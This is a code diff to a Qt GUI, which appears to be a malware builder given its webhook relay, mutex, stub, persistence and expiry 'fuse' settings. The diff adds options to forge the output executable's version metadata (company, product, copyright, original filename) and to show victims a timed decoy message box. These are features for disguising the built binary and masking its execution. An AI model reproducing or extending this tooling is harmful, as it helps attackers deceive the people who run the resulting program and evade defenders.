@@ -125,7 +125,12 @@ class MainWindow(QWidget):
         for widget in (self._relay._endpoint, self._relay._ping, self._relay._mention,
                        self._tuning._mutex, self._tuning._seal_key,
                        self._tuning._output, self._forge._name, self._forge._stub,
-                       self._forge._icon, self._forge._fuse):
+                       self._forge._icon, self._forge._fuse,
+                       self._forge._company, self._forge._product,
+                       self._forge._description, self._forge._copyright,
+                       self._forge._original_name, self._forge._file_version,
+                       self._forge._product_version, self._forge._decoy_seconds,
+                       self._forge._decoy_title, self._forge._decoy_text):
             widget.changed.connect(self._revalidate)
         self._relay._kind.currentIndexChanged.connect(self._revalidate)
         # The fallback rows are built and destroyed at runtime, so the page re-emits one
@@ -286,6 +291,7 @@ class MainWindow(QWidget):
         relay = self._relay.values()
         tuning = self._tuning.values()
         sources = self._sources.values()
+        seconds, title, text = self._forge.decoy()
         return config_from(
             relay_kind=relay["relay_kind"],
             endpoint=relay["endpoint"],
@@ -300,6 +306,10 @@ class MainWindow(QWidget):
             keep_local=bool(tuning["keep_local"]),
             persist=bool(tuning["persist"]),
             persist_hours=int(tuning["persist_hours"]),
+            version=self._forge.version(),
+            decoy_seconds=seconds,
+            decoy_title=title,
+            decoy_text=text,
         )
 
     def _revalidate(self, *_args) -> None:
@@ -363,6 +373,7 @@ class MainWindow(QWidget):
             stub=self._forge.stub(),
             icon=self._forge.icon(),
             fuse=self._forge.fuse(),
+            version=self._forge.version(),
             parent=self,
         )
         worker.progress.connect(self._run.on_progress)
